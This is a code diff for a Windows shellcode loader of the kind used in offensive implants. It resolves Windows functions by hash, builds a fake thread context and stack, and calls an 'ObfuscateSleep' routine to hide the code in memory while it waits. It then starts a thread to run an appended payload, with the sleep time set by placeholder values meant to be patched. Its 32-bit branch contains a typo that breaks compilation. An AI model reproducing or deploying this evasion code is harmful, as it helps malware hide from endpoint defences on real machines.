@@ -16,22 +16,24 @@
 
 #include "common.h"
 
-D_SEC(B) VOID WINAPI Start( VOID )
+D_SEC(B) VOID WINAPI Start( ULONG Length )
 {
+	HANDLE        Thd;
 	HMODULE       Mod;
-	CONTEXT       Ctx;
 	INSTANCE      Ins;
-	LARGE_INTEGER Del;
-	UCHAR         Stk[0x100];
 
 	Ins.kb.Base = PebGetModule( H_KERNELBASE );
+	Ins.km.Base = PebGetModule( H_KERNEL32 );
 	Ins.nt.Base = PebGetModule( H_NTDLL );
 	Ins.Buffer  = C_PTR( _GET_BEG() );
-	Ins.Length  = U_PTR( _GET_END() ) - U_PTR( _GET_BEG() );
+	Ins.Length  = U_PTR( _GET_END() ) - U_PTR( _GET_BEG() ) + Length;
 
 	if ( Ins.kb.Base ) {
 		Ins.kb.SetProcessValidCallTargets = PeGetFuncEat( Ins.kb.Base, H_SETPROCESSVALIDCALLTARGETS );
 	};
+
+	Ins.km.LocalFileTimeToFileTime        = PeGetFuncEat( Ins.km.Base, H_LOCALFILETIMETOFILETIME );
+	Ins.km.SystemTimeToFileTime           = PeGetFuncEat( Ins.km.Base, H_SYSTEMTIMETOFILETIME );
 
 	Ins.nt.NtSignalAndWaitForSingleObject = PeGetFuncEat( Ins.nt.Base, H_NTSIGNALANDWAITFORSINGLEOBJECT );
 	Ins.nt.NtQueryInformationProcess      = PeGetFuncEat( Ins.nt.Base, H_NTQUERYINFORMATIONPROCESS );
@@ -56,15 +58,54 @@ D_SEC(B) VOID WINAPI Start( VOID )
 	Ins.nt.NtContinue                     = PeGetFuncEat( Ins.nt.Base, H_NTCONTINUE );
 	Ins.nt.ExitThread                     = PeGetFuncEat( Ins.nt.Base, H_EXITTHREAD );
 	Ins.nt.NtClose                        = PeGetFuncEat( Ins.nt.Base, H_NTCLOSE );
+	
+	UCHAR           FakeStk[0x100];
+	CONTEXT         FakeCtx;
 
-	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
-	RtlSecureZeroMemory( &Del, sizeof( Del ) );
-	RtlSecureZeroMemory( Stk, 0x100 );
+	RtlSecureZeroMemory( &FakeCtx, sizeof( FakeCtx ) );
+	RtlSecureZeroMemory( &FakeStk, 0x100 );
 
-	Ctx.ContextFlags = CONTEXT_FULL;
-	Ctx.Rsp          = U_PTR( &Stk[0x100 - 1] );
-	Ctx.Rip          = U_PTR( Ins.nt.RtlFreeHeap );
-	Del.QuadPart     = -( 90000 * 10000 );
+#if defined( _WIN64 )
+	FakeCtx.ContextFlags = CONTEXT_FULL;
+	FakeCtx.Rip = U_PTR( Ins.nt.RtlFreeHeap );
+	FakeCtx.Rsp = U_PTR( &FakeStk );
+#else
+	FaleCtx.ContextFlags = CONTEXT_FULL;
+	FakeCtx.Eip = U_PTR( Ins.nt.RtlFreeHeap );
+	FakeCtx.Esp = U_PTR( &FakeStk );
+#endif
 
-	ObfuscateSleep( &Ins, &Ctx, &Del );
+	FILETIME	LocalTimeZon;
+	FILETIME	LocalTimeUtc;
+	SYSTEMTIME	LocalTimeSys;
+	LARGE_INTEGER   LocalTimeOut;
+
+	RtlSecureZeroMemory( &LocalTimeZon, sizeof( LocalTimeZon ) );
+	RtlSecureZeroMemory( &LocalTimeUtc, sizeof( LocalTimeUtc ) );
+	RtlSecureZeroMemory( &LocalTimeSys, sizeof( LocalTimeSys ) );
+	RtlSecureZeroMemory( &LocalTimeOut, sizeof( LocalTimeOut ) );
+
+	LocalTimeSys.wMonth = 0x4242;
+	LocalTimeSys.wYear  = 0x4343;
+	LocalTimeSys.wDay   = 0x4444;
+
+	Ins.km.SystemTimeToFileTime( &LocalTimeSys, &LocalTimeZon );
+	Ins.km.LocalFileTimeToFileTime( &LocalTimeZon, &LocalTimeUtc );
+	LocalTimeOut.LowPart  = LocalTimeUtc.dwLowDateTime;
+	LocalTimeOut.HighPart = LocalTimeUtc.dwHighDateTime;
+
+	ObfuscateSleep( &Ins, &FakeCtx, &LocalTimeOut );
+	Ins.nt.NtCreateThreadEx(
+			&Thd,
+			THREAD_ALL_ACCESS,
+			NULL,
+			NtCurrentProcess(),
+			C_PTR( _GET_END( ) ),
+			NULL,
+			FALSE,
+			0,
+			0xFFFFFF,
+			0xFFFFFF,
+			NULL
+			); Ins.nt.NtClose( Thd );
 };
